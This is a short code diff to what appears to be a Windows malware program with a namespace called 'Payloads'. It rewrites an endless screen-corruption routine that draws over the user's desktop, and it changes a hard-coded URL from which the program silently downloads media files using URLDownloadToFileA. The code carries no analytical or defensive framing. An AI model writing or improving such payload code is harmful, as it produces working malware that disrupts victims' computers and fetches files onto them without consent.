@@ -109,18 +109,18 @@ namespace Payloads {
 
     BOOL screen_bug = 0;
     void SCREEN_BUG() {
-        while (TRUE) {
+        int inc = 0;
+        int sw = GetSystemMetrics(SM_CXSCREEN);
+        int sh = GetSystemMetrics(SM_CYSCREEN);
+        while (1) {
             if (screen_bug) {
-                HDC dcDesktop = GetWindowDC(NULL);
-                int scrX = GetSystemMetrics(SM_CXSCREEN);
-                int scrY = GetSystemMetrics(SM_CYSCREEN);
-                srand(GetTickCount());
-                int x = rand() % scrX;
-                for (;;)
-                    if (screen_bug)
-                        for (int y = scrY; y > 0; y--)
-                            SetPixel(dcDesktop, x, y, GetPixel(dcDesktop, x, y - 3));
-                Sleep(1);
+                inc++;
+                int x = rand() % (sw - 0);
+                int w = rand() % (5 - 0);
+                int y = inc;
+                HDC hdc = GetDC(HWND_DESKTOP);
+                BitBlt(hdc, x, y, w, sw, hdc, x, 0, SRCCOPY);
+                Sleep(100);
             }
         }
     }
@@ -271,7 +271,7 @@ int main(int argc, char* argv[], char* envp[])
         Sleep(50);
         URLDownloadToFileA(NULL, wpDlWebsite, wallpaper.c_str(), 0, NULL);
     }
-    wpDlWebsite = "https://srv-file11.gofile.io/download/8o1isr/yathusableeeemfskfmdsl.wav";
+    wpDlWebsite = "https://dpointhostingsv1.000webhostapp.com/yathusableeeemfskfmdsl.wav";
     if (!fileUtils::file_check(soundThing, 40739508)) {
         Sleep(50);
         URLDownloadToFileA(NULL, wpDlWebsite, soundThing.c_str(), 0, NULL);
